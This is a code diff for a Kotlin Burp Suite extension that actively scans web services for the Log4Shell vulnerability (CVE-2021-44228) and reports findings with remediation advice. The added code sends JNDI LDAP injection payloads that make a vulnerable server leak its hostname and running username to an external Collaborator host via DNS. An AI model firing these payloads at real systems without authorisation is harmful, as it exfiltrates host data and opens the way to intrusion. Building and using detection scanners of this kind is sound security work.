@@ -40,7 +40,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
                     for (entry in interactions.entries) {
                         val payload = entry.key
                         val (hrr, poff) = crontab[payload] ?: continue
-                        handleInteractions(hrr, poff, entry.value, sync = false).forEach(callbacks::addScanIssue)
+                        handleInteractions(listOf(Pair(hrr, poff)), entry.value, sync = false).forEach(callbacks::addScanIssue)
                     }
                 }
             } catch (ex: InterruptedException) {
@@ -63,26 +63,34 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
             Collections.emptyList() // not relevant
 
     override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
-        val payload = collaborator.generatePayload(false)
-        val bytes = "\${jndi:ldap://\${hostName}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
-        val request = insertionPoint!!.buildRequest(bytes)
-        val poff = insertionPoint.getPayloadOffsets(bytes)
-        val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
-        val interactions = handleInteractions(hrr, poff,
-                collaborator.fetchCollaboratorInteractionsFor(payload), sync = true)
-        crontab[payload] = Pair(hrr, poff)
+        val context = mutableListOf<Pair<IHttpRequestResponse, IntArray>>()
+        val collabResults = mutableListOf<IBurpCollaboratorInteraction>()
+        for ((prefix, key) in listOf(Pair("h", "hostName"), Pair("u", "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
+            val payload = collaborator.generatePayload(false)
+            val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
+            val request = insertionPoint!!.buildRequest(bytes)
+            val poff = insertionPoint.getPayloadOffsets(bytes)
+            val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
+            context.add(Pair(hrr, poff))
+            collabResults.addAll(collaborator.fetchCollaboratorInteractionsFor(payload))
+            crontab[payload] = Pair(hrr, poff)
+        }
+        val interactions = handleInteractions(context, collabResults, sync = true)
         synchronized(thread) {
             if (!thread.isAlive) thread.start()
         }
         return interactions
     }
 
-    private fun handleInteractions(hrr: IHttpRequestResponse, poff: IntArray,
+    private fun handleInteractions(context: List<Pair<IHttpRequestResponse, IntArray>>,
                                    interactions: List<IBurpCollaboratorInteraction>,
                                    sync: Boolean): MutableList<IScanIssue> {
         if (interactions.isEmpty()) return Collections.emptyList()
+        val hrr = context[0].first
         val iri = helpers.analyzeRequest(hrr)
-        val markers = callbacks.applyMarkers(hrr, Collections.singletonList(poff), Collections.emptyList())
+        val markers = context.map { (hrr, poff) ->
+            callbacks.applyMarkers(hrr, Collections.singletonList(poff), Collections.emptyList()) as IHttpRequestResponse
+        }.toTypedArray()
         return Collections.singletonList(object : IScanIssue {
             override fun getUrl(): URL = iri.url
             override fun getIssueName(): String = "Log4Shell (CVE-2021-44228) - " + (if (sync) "synchronous" else "asynchronous")
@@ -93,7 +101,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
             override fun getRemediationBackground(): String? = null
             override fun getRemediationDetail(): String = "Version 2.15.0 of log4j has been released without the vulnerability." +
                     "<br><br><code>log4j2.formatMsgNoLookups=true</code> can also be set as a mitigation on affected versions."
-            override fun getHttpMessages(): Array<IHttpRequestResponse> = arrayOf(markers)
+            override fun getHttpMessages(): Array<IHttpRequestResponse> = markers
             override fun getHttpService(): IHttpService = hrr.httpService
             override fun getIssueDetail(): String {
                 val sb = StringBuilder("<p>The application interacted with the Collaborator server <b>")
@@ -103,7 +111,9 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
                     sb.append("some time after")
                 }
                 sb.append("</b> a request with a Log4Shell payload</p><ul>")
+
                 interactions.map(this::formatInteraction).toSortedSet().forEach { sb.append(it) }
+
                 sb.append("</ul><p>This means that the web service (or another node in the network) is affected by this vulnerability. ")
                 sb.append("However, actual exploitability might depend on an attacker-controllable LDAP server being reachable over the network.</p>")
                 if (!sync) {
@@ -120,8 +130,14 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
                 val sb = StringBuilder()
                 val type = interaction.getProperty("type")
                 if (type == "DNS") {
-                    sb.append("<li>By the host named <b>")
-                    sb.append(extractHostname(helpers.base64Decode(interaction.getProperty("raw_query"))))
+                    val hostUser = extractHostUser(helpers.base64Decode(interaction.getProperty("raw_query")))
+                    if (hostUser == null) {
+                        sb.append("<li><b>DNS")
+                    } else {
+                        val (host, user) = hostUser
+                        sb.append("<li>By the host named <b>$host")
+                        if (user != null) sb.append("</b> running as user <b>$user")
+                    }
                 } else {
                     sb.append("<li><b>")
                     sb.append(type)
@@ -147,9 +163,16 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
     }
 }
 
-private fun extractHostname(query: ByteArray): String? {
+private fun extractHostUser(query: ByteArray): Pair<String, String?>? {
     if (query[4] != 0.toByte() || query[5] != 1.toByte()) return null
     val len = query[12].toInt()
     if (len and 0xc0 != 0) return null
-    return query.decodeToString(startIndex = 13, endIndex = 13 + len)
+    val decoded = query.decodeToString(startIndex = 13, endIndex = 13 + len)
+    if (decoded.startsWith('h')) {
+        return Pair(decoded.substring(1), null)
+    } else if (decoded.startsWith('u')) {
+        val parts = decoded.substring(1).split("-s2u-")
+        if (parts.size != 2) return null
+        return Pair(parts[0], parts[1])
+    } else return null
 }
